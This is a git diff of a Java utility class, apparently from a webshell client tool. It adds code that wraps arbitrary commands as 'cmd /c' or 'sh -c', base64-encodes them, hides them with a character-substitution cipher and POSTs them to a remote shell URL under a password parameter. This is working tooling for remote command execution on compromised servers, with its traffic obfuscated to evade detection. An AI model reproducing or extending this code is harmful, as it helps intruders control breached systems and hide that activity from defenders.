@@ -4,6 +4,8 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
 import java.io.IOException;
+import java.util.List;
+
 import okhttp3.FormBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -28,18 +30,37 @@ public class Util {
 		}
 	}
 	
-	public static String DoCode(String pfm) {
+	public static String DoCode(String pfm,List<String> cmdlist) {
+		String cmd="";
+		for (int i = 1; i < cmdlist.size(); i++) {
+			cmd=cmd+cmdlist.get(i)+" ";
+		}
 		switch (pfm) {
 		case "win":
-			
-			break;
+			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "cmd /c "+cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			return res;
 		case "unix":
-			break;
+			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "sh -c "+cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			return res2;
 		default:
-			break;
+			return "";
 		}
 	}
 	
+	public static String EnChar(String content,String key,String words) {
+		for (int i = 0; i <key.length(); i++) {
+			content=content.replace(words.substring(i,i+1), key.substring(i,i+1));
+		}
+		return content;
+	}
+	
+	
+	public static String DeChar(String content,String key,String words) {
+		for (int i = 0; i <key.length(); i++) {
+			content=content.replace(key.substring(i,i+1),words.substring(i,i+1));
+		}
+		return content;
+	}
 	public static String GetResponseString(String pass,String url,String content,String key,String words) {
 		FormBody.Builder formbuild=new FormBody.Builder();
 		formbuild.add(pass, content);
